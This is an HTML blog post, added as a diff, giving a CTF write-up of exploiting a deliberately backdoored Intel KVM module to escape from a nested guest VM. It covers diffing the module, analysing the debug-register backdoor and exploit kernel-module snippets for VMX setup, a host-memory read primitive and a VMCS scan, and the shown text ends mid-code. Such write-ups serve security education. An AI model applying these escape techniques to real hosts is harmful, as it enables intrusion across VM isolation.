@@ -1,0 +1,1268 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>corCTF 2024: trojan-turtles writeup - zolutal’s blog</title>
+<meta name="description" content="This year I played corCTF with Shellphish, and we did pretty well – placing 6th! I worked on two challenges: ‘trojan-turtles’ and ‘its-just-a-dos-bug-bro’, in the end we solved both of them and both only had two solves by the end.">
+
+
+  <meta name="author" content="Justin Miller">
+  
+  <meta property="article:author" content="Justin Miller">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="zolutal's blog">
+<meta property="og:title" content="corCTF 2024: trojan-turtles writeup">
+<meta property="og:url" content="https://zolutal.github.io/corctf-trojan-turtles/">
+
+
+  <meta property="og:description" content="This year I played corCTF with Shellphish, and we did pretty well – placing 6th! I worked on two challenges: ‘trojan-turtles’ and ‘its-just-a-dos-bug-bro’, in the end we solved both of them and both only had two solves by the end.">
+
+
+
+
+
+  <meta name="twitter:site" content="@zolutal">
+  <meta name="twitter:title" content="corCTF 2024: trojan-turtles writeup">
+  <meta name="twitter:description" content="This year I played corCTF with Shellphish, and we did pretty well – placing 6th! I worked on two challenges: ‘trojan-turtles’ and ‘its-just-a-dos-bug-bro’, in the end we solved both of them and both only had two solves by the end.">
+  <meta name="twitter:url" content="https://zolutal.github.io/corctf-trojan-turtles/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2024-07-28T00:00:00+00:00">
+
+
+
+
+
+
+<link rel="canonical" href="https://zolutal.github.io/corctf-trojan-turtles/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Justin Miller",
+      "url": "https://zolutal.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          zolutal's blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about">about</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="https://zolutal.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">corCTF 2024: trojan-turtles writeup</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Justin Miller</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>systems hacking</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Arizona</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+            <li><a href="https://twitter.com/zolutal" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/zolutal" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="corCTF 2024: trojan-turtles writeup">
+    <meta itemprop="description" content="This year I played corCTF with Shellphish, and we did pretty well – placing 6th!I worked on two challenges: ‘trojan-turtles’ and ‘its-just-a-dos-bug-bro’, in the end we solved both of them and both only had two solves by the end.">
+    <meta itemprop="datePublished" content="2024-07-28T00:00:00+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">corCTF 2024: trojan-turtles writeup
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-07-28T00:00:00+00:00">July 28, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          18 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>This year I played corCTF with Shellphish, and we did pretty well – placing 6th!
+I worked on two challenges: ‘trojan-turtles’ and ‘its-just-a-dos-bug-bro’, in the end we solved both of them and both only had two solves by the end.</p>
+
+<p>This will be a writeup for ‘trojan-turtles’, a challenge which involved exploiting a backdoored KVM kernel module from a guest VM to read the flag located on the host.</p>
+
+<p>Here is the challenge description for some more context:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A mysterious person who goes by Tia Jan recently replaced our nested hypervisor's Intel KVM driver with a new driver.
+Can you take a look at this and see if our systems have been compromised?
+
+Note that the goal of this challenge is to escape from the L2 guest to the root user on the L1 guest.
+You will need an Intel system with modern VMX extensions to debug this challenge.
+
+The L1 guest is running a 6.9.0 kernel with the provided kconfig below. The L2 guest is running a 5.15.0-107 Ubuntu HWE kernel.
+You can retrieve the necessary headers from the following links:
+- https://packages.ubuntu.com/focal/linux-headers-5.15.0-107-generic
+- https://packages.ubuntu.com/focal-updates/linux-hwe-5.15-headers-5.15.0-107
+
+You can download the 6.9.0 kernel source at https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.9.tar.xz
+</code></pre></div></div>
+
+<p>Here are the provided files:</p>
+
+<p>dist:
+<a href="/assets/corctf-trojan-turtles/dist/bzImage">bzImage</a>
+<a href="/assets/corctf-trojan-turtles/dist/chall.qcow2">chall.qcow2</a>
+<a href="/assets/corctf-trojan-turtles/dist/kconfig">kconfig</a>
+<a href="/assets/corctf-trojan-turtles/dist/kvm-intel-original.ko">kvm-intel-original.ko</a>
+<a href="/assets/corctf-trojan-turtles/dist/kvm-intel-new.ko">kvm-intel-new.ko</a>
+<a href="/assets/corctf-trojan-turtles/dist/run.sh">run.sh</a>
+<a href="/assets/corctf-trojan-turtles/dist/linux-headers-5.15.0-107-generic_5.15.0-107.117~20.04.1_amd64.deb">linux-headers-5.15.0-107-generic_5.15.0-107.117~20.04.1_amd64.deb</a>
+<a href="/assets/corctf-trojan-turtles/dist/linux-hwe-5.15-headers-5.15.0-107_5.15.0-107.117~20.04.1_all.deb">linux-hwe-5.15-headers-5.15.0-107_5.15.0-107.117~20.04.1_all.deb</a></p>
+
+<p>exploit (kernel module):
+<a href="/assets/corctf-trojan-turtles/dist/exploit.c">exploit.c</a></p>
+
+<h2 id="background">Background</h2>
+
+<p>Given that this challenge is about ‘escaping KVM’, I figured I’d provide some background on KVM and virtualization.</p>
+
+<h3 id="what-is-it">what is it</h3>
+<p>KVM stands for ‘Kernel-based Virtual Machine’, and it provides an in-kernel api for creating virtual machines.
+Essentially its purposes are to abstract a lot of the vendor specific implementations of virtualization features, e.g. Intel’s VMX and AMD’s SVM, and provide an API to userspace through which the privileged operations required for configuring virtualization may be performed.</p>
+
+<p>The API is implemented as a device driver “/dev/kvm” with various commands that can be issued via <code class="language-plaintext highlighter-rouge">ioctl</code>.
+This means, for example, that rather than needing to understand your processor vendor’s virtualization features and write your own kernel module to set a VM’s registers you can simply use the <code class="language-plaintext highlighter-rouge">KVM_SET_REGS</code> command.
+You can read more about the KVM API in the kenel docs here: <a href="https://docs.kernel.org/virt/kvm/api.html">https://docs.kernel.org/virt/kvm/api.html</a></p>
+
+<p>KVM can either be compiled into the kernel or compiled as a separate kernel module, e.g. kvm-intel.ko.
+This depends on the config that was used to compile the kernel, if <code class="language-plaintext highlighter-rouge">CONFIG_KVM_INTEL</code> is set to <code class="language-plaintext highlighter-rouge">y</code> it will be compiled in to the kernel image, if it is set to ‘m’ it will be a kernel module.</p>
+
+<p>When you execute qemu-system with <code class="language-plaintext highlighter-rouge">--enable-kvm</code> Qemu uses the KVM API rather than doing emulation.</p>
+
+<h3 id="hardware-assisted-virtualization">hardware assisted virtualization</h3>
+<p>There are several methods for creating virtual machines, including trap-and-emulate, hardware assisted virtualization, and full emulation. In the case of KVM, we are dealing with hardware assisted virtualization.
+This is a really cool feature of modern CPUs where you can enter into an execution mode that uses a different state – registers, address space, etc. – which is isolated from your host’s state.</p>
+
+<p>Certain operations that the VM performs will cause a ‘VMEXIT’, exiting the virtualization for the host to handle the operations.
+What operations cause VMEXITs is configurable but some common VMEXITs are the result of IO/MMIO operations, halts, the cpuid instruction, and shutdowns.
+One especially relevant class of instructions that can be handled via VMEXITs is virtualization instructions, the same instructions that KVM will use to setup and modify VM state, which allows you to create hardware assisted VMs inside of other hardware assisted VMs.</p>
+
+<p>Hardware assisted virtualization enables a better version of what trap-and-emulate wants to achieve, since with hardware virtualization not every privileged instruction needs to be emulated by the host kernel.
+The processor can handle most of the privileged instructions in the virtualized guest’s context but certain operations can still trap via a VMEXIT to the host kernel to be emulated.</p>
+
+<h2 id="diffing">Diffing</h2>
+
+<p>Based on the description and the two versions of kvm-intel.ko attached to the challenge, we can assume the vulnerability is in the .ko and not in the bzImage.
+Seeing this, I did some highly-advanced-binary-diffing(tm) by opening the kernel modules in binary ninja, exporting the HLIL of each to a file and diffing them.</p>
+
+<p>The constant 0x1337babe stood out in the diff, probably the backdoor we were looking for:</p>
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gi">&gt;                 label_1f0ac:
+&gt;                 int64_t rax_8
+&gt;                 int64_t rsi_7
+&gt;                 rax_8, rsi_7 = kvm_get_dr(rbp, 0)
+&gt;
+&gt;                 if (rax_8 == 0x1337babe)
+&gt;                     int64_t rax_28 = kvm_get_dr(rbp, 1)
+&gt;                     int64_t rax_29
+&gt;                     rax_29, rsi_7 = kvm_get_dr(rbp, 2)
+&gt;                     *(r12 + (rax_28 &lt;&lt; 3)) = rax_29
+&gt;
+</span></code></pre></div></div>
+
+<p>On closer inspection there were two locations where that constant appeared: in the functions <code class="language-plaintext highlighter-rouge">handle_vmread</code> and <code class="language-plaintext highlighter-rouge">handle_vmwrite</code></p>
+
+<h2 id="analyzing-the-backdoor">Analyzing the Backdoor</h2>
+<p>So we found suspicious code but what does that code do?</p>
+
+<p>As I mentioned earlier, virtualization instructions can cause VMEXITs to be handled by the parent VM.
+Two such virtualization instructions are ‘vmread’ and ‘vmwrite’, which correspond to the two handler functions modified in the provided kvm-intel.ko.</p>
+
+<p>In the context of this challenge we have code execution in a guest VM of the VM that has the vulnerable KVM module.
+So reasonably to hit the vulnerable code it would make sense that we just need to execute the related instruction in our VM.</p>
+
+<p>Taking a closer look at those modified functions:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int64_t</span> <span class="n">handle_vmread</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">arg1</span><span class="p">)</span>
+    <span class="kt">void</span><span class="o">*</span> <span class="n">rbp</span> <span class="o">=</span> <span class="n">arg1</span>
+    <span class="kt">void</span><span class="o">*</span> <span class="n">r15</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">arg1</span> <span class="o">+</span> <span class="mh">0x1c78</span><span class="p">)</span>
+    <span class="kt">void</span><span class="o">*</span> <span class="n">gsbase</span>
+    <span class="kt">int64_t</span> <span class="n">rax</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">gsbase</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span>
+    <span class="p">...</span>
+                <span class="kt">int64_t</span> <span class="n">rax_9</span>
+                <span class="n">rax_9</span><span class="p">,</span> <span class="n">rsi_1</span> <span class="o">=</span> <span class="n">kvm_get_dr</span><span class="p">(</span><span class="n">rbp</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+
+                <span class="k">if</span> <span class="p">(</span><span class="n">rax_9</span> <span class="o">==</span> <span class="mh">0x1337babe</span><span class="p">)</span>
+                    <span class="n">rsi_1</span> <span class="o">=</span> <span class="n">kvm_set_dr</span><span class="p">(</span><span class="n">rbp</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">r15</span> <span class="o">+</span> <span class="p">(</span><span class="n">kvm_get_dr</span><span class="p">(</span><span class="n">rbp</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>We see in handle vmread that the introduced code is using the <code class="language-plaintext highlighter-rouge">kvm_get_dr</code> function to read the guest’s debug registers.
+In steps it:</p>
+<ul>
+  <li>reads dr0 and checks that it’s value matches <code class="language-plaintext highlighter-rouge">0x1337babe</code></li>
+  <li>reads dr1, shifts its value left by 3, adds it to whatever is in r15, and dereferences that value</li>
+  <li>sets the value it read based on dr1 into dr0</li>
+</ul>
+
+<p>From this we realized it is effectively an arbitrary read relative to the value in r15.
+After reading the orignal source it became clear that this is the pointer to our VMCS (the one we just allocated in our guest), in the host’s address space:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">handle_vmread</span><span class="p">(</span><span class="k">struct</span> <span class="n">kvm_vcpu</span> <span class="o">*</span><span class="n">vcpu</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">vmcs12</span> <span class="o">*</span><span class="n">vmcs12</span> <span class="o">=</span> <span class="n">is_guest_mode</span><span class="p">(</span><span class="n">vcpu</span><span class="p">)</span> <span class="o">?</span> <span class="n">get_shadow_vmcs12</span><span class="p">(</span><span class="n">vcpu</span><span class="p">)</span>
+                            <span class="o">:</span> <span class="n">get_vmcs12</span><span class="p">(</span><span class="n">vcpu</span><span class="p">);</span>
+<span class="p">...</span>
+</code></pre></div></div>
+
+<p>After a peek at the <code class="language-plaintext highlighter-rouge">handle_vmwrite</code> function:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int64_t</span> <span class="n">handle_vmwrite</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">arg1</span><span class="p">)</span>
+    <span class="kt">void</span><span class="o">*</span> <span class="n">rbp</span> <span class="o">=</span> <span class="n">arg1</span>
+    <span class="kt">void</span><span class="o">*</span> <span class="n">r12</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">arg1</span> <span class="o">+</span> <span class="mh">0x1c78</span><span class="p">)</span>
+    <span class="kt">void</span><span class="o">*</span> <span class="n">gsbase</span>
+    <span class="kt">int64_t</span> <span class="n">rax</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">gsbase</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span>
+    <span class="p">...</span>
+                    <span class="n">rax_8</span><span class="p">,</span> <span class="n">rsi_7</span> <span class="o">=</span> <span class="n">kvm_get_dr</span><span class="p">(</span><span class="n">rbp</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+
+                    <span class="k">if</span> <span class="p">(</span><span class="n">rax_8</span> <span class="o">==</span> <span class="mh">0x1337babe</span><span class="p">)</span>
+                        <span class="kt">int64_t</span> <span class="n">rax_28</span> <span class="o">=</span> <span class="n">kvm_get_dr</span><span class="p">(</span><span class="n">rbp</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+                        <span class="kt">int64_t</span> <span class="n">rax_29</span>
+                        <span class="n">rax_29</span><span class="p">,</span> <span class="n">rsi_7</span> <span class="o">=</span> <span class="n">kvm_get_dr</span><span class="p">(</span><span class="n">rbp</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+                        <span class="o">*</span><span class="p">(</span><span class="n">r12</span> <span class="o">+</span> <span class="p">(</span><span class="n">rax_28</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">=</span> <span class="n">rax_29</span>
+</code></pre></div></div>
+
+<p>It became clear that this was an arbitrary write based on also relative to our VMCS based on the offset in dr1 and value in dr2.</p>
+
+<h2 id="hitting-the-backdoor">Hitting the Backdoor</h2>
+
+<p>Unfortunately hitting those handlers wasn’t quite so simple.</p>
+
+<p>To be able to execute the vmread/vmwrite instructions some setup is required.
+Thankfully, I got some help from a teamate who is far more familiar with Intel’s virtualization features than I am when figuring this part out.
+The vmread and vmwrite instructions are for interacting with the “Virtual-Machine Control Structure” (VMCS), but at the moment in our VM the virtualization feature isn’t enabled and we don’t have a valid VMCS.</p>
+
+<p>Also note that all of the virtualization instructions are privileged so the exploit code snippets in this post are part of a kernel module.</p>
+
+<p>So first I enabled the VMX feature by setting the VMXE bit in cr4:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">cr4</span> <span class="o">=</span> <span class="n">native_read_cr4</span><span class="p">();</span>
+    <span class="n">cr4</span> <span class="o">|=</span> <span class="mi">1ul</span> <span class="o">&lt;&lt;</span> <span class="mi">13</span><span class="p">;</span>
+    <span class="n">native_write_cr4</span><span class="p">(</span><span class="n">cr4</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Next I had to create a valid VMXON region and VMCS, which is done by allocating two pages, setting the <code class="language-plaintext highlighter-rouge">vmcs_revision</code> value into the start of the page, then executing vmxon and vmptrld with the physical addresses of those pages:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    vmxon_page = kzalloc(0x1000, GFP_KERNEL);
+    vmptrld_page = kzalloc(0x1000, GFP_KERNEL);
+
+    vmxon_page_pa = virt_to_phys(vmxon_page);
+    vmptrld_page_pa = virt_to_phys(vmptrld_page);
+
+    *(uint32_t *)(vmxon_page) = vmcs_revision();
+    *(uint32_t *)(vmptrld_page) = vmcs_revision();
+
+    res = vmxon(vmxon_page_pa);
+    res = vmptrld(vmptrld_page_pa);
+</code></pre></div></div>
+<p>My teamate linked me this resource which provides some more specific information on this stuff and was extremely helpful: <a href="https://wiki.osdev.org/VMX">https://wiki.osdev.org/VMX</a></p>
+
+<p>Finally, after doing that setup, we can execute the vmread/vmwrite instructions to hit the vulnerable code as such:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    asm volatile("vmread %[field], %[output]\n\t"
+          : [output] "=r" (vmread_value)
+          : [field] "r" (vmread_field) : );
+
+    asm volatile("vmwrite %[value], %[field]\n\t"
+          :
+          : [field] "r" (vmwrite_field),
+            [value] "r" (vmwrite_value) : );
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<p>The exploitation for this challenge was really fun, I think the most clear path for exploitation would have been to create a ROP chain in the host’s address space, which reads the flag into the guest’s address space, and cause a stack pivot to it.
+But my teamate suggested a path that sounded more interesting: messing with Extended Page Table (EPT) feature to map the host’s address space into the guest.</p>
+
+<p>It sounded like a approach to try so I went for it, but in practice I knew nothing about EPT and getting to the point where I could even do that was pretty challenging.</p>
+
+<h3 id="the-goal">the goal</h3>
+
+<p>So the plan is either:</p>
+
+<p>Find the host’s VMCS for the VM we are executing in and hijack the Extended Page Table Pointer (EPTP) in the structure to point to a forged EPT.</p>
+
+<p>- OR -</p>
+
+<p>Find the existing EPT, by reading the EPTP, for our VM and insert entries to map all of the host’s memory into the guest.</p>
+
+<p>The approach I ended up going for was writing entries into the existing EPT for the guest.
+The challenge here is we needed to find the VMCS for the guest VM to find the EPTP, and we will need information about the host’s memory layout to know the offset to the existing EPT to modify and to walk one level of the EPT .</p>
+
+<h3 id="finding-the-guest-vmcs">finding the guest VMCS</h3>
+
+<p>The VMCS we created, and which we have relative arb read/write from, is allocated somewhere in the host’s heap.
+Which is convenient because it means we have access to the kernel’s physmap, containing everything we could possibly want to read or write.</p>
+
+<p>For this purpose I turned the arbitrary read in <code class="language-plaintext highlighter-rouge">handle_vmread</code> into this primitive, which just sets db0, db1, executes a vmread, then returns the value of dr2:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">noinline</span> <span class="kt">uint64_t</span> <span class="nf">read_guy</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="kt">uint64_t</span> <span class="n">vmread_field</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">vmread_value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">native_set_debugreg</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1337babe</span><span class="p">);</span>
+    <span class="n">native_set_debugreg</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+    <span class="n">asm</span> <span class="k">volatile</span><span class="p">(</span> <span class="s">"vmread %[field], %[output]</span><span class="se">\n\t</span><span class="s">"</span>
+              <span class="o">:</span> <span class="p">[</span><span class="n">output</span><span class="p">]</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">vmread_value</span><span class="p">)</span>
+              <span class="o">:</span> <span class="p">[</span><span class="n">field</span><span class="p">]</span> <span class="s">"r"</span> <span class="p">(</span><span class="n">vmread_field</span><span class="p">)</span> <span class="o">:</span> <span class="p">);</span>
+    <span class="n">val</span> <span class="o">=</span> <span class="n">native_get_debugreg</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">val</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now we were able to start scanning the host’s memory to find the guest’s VMCS!
+But there was still the question of what value are we actually looking for when scanning…</p>
+
+<p>Here is a truncated definition of the <code class="language-plaintext highlighter-rouge">struct vmcs12</code> that we are looking for:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">__packed</span> <span class="n">vmcs12</span> <span class="p">{</span>
+    <span class="cm">/* According to the Intel spec, a VMCS region must start with the
+     * following two fields. Then follow implementation-specific data.
+     */</span>
+    <span class="k">struct</span> <span class="n">vmcs_hdr</span> <span class="n">hdr</span><span class="p">;</span>
+    <span class="n">u32</span> <span class="n">abort</span><span class="p">;</span>
+
+    <span class="n">u32</span> <span class="n">launch_state</span><span class="p">;</span> <span class="cm">/* set to 0 by VMCLEAR, to 1 by VMLAUNCH */</span>
+    <span class="n">u32</span> <span class="n">padding</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span> <span class="cm">/* room for future expansion */</span>
+
+    <span class="n">u64</span> <span class="n">io_bitmap_a</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">io_bitmap_b</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">msr_bitmap</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">vm_exit_msr_store_addr</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">vm_exit_msr_load_addr</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">vm_entry_msr_load_addr</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">tsc_offset</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">virtual_apic_page_addr</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">apic_access_addr</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">posted_intr_desc_addr</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">ept_pointer</span><span class="p">;</span>
+    <span class="p">...</span>
+    <span class="n">natural_width</span> <span class="n">guest_gdtr_base</span><span class="p">;</span>
+    <span class="n">natural_width</span> <span class="n">guest_idtr_base</span><span class="p">;</span>
+    <span class="n">natural_width</span> <span class="n">guest_dr7</span><span class="p">;</span>
+    <span class="n">natural_width</span> <span class="n">guest_rsp</span><span class="p">;</span>
+    <span class="n">natural_width</span> <span class="n">guest_rip</span><span class="p">;</span>
+    <span class="n">natural_width</span> <span class="n">guest_rflags</span><span class="p">;</span>
+    <span class="p">...</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>From the fields in this struct I looked for fields that would be fairly unique and that I knew the value of, I ended up choosing the <code class="language-plaintext highlighter-rouge">guest_idtr_base</code>.
+Conveniently, the VMCS is required to be page aligned so I just needed to look for the IDT base address <code class="language-plaintext highlighter-rouge">0xfffffe0000000000</code> at offset 0x208 at at page granularity:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">noinline</span> <span class="kt">int</span> <span class="nf">find_l1_vmcs</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">l1_vmcs_offset</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">pos_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">neg_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">zero_val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pos_val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">neg_val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">found_val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">found_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">zero_val</span> <span class="o">=</span> <span class="n">read_guy</span><span class="p">(</span><span class="mi">0ull</span><span class="p">);</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"vmcs12[0] = %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">zero_val</span><span class="p">);</span>
+
+    <span class="c1">// scan in each direction looking for the guest_idtr_base field of the l1 vm</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x4000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// from attaching to the l1 guest, the address of guest_idtr_base always has 0x208 in the lower 3 nibbles</span>
+        <span class="n">pos_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">i</span> <span class="o">*</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x208</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
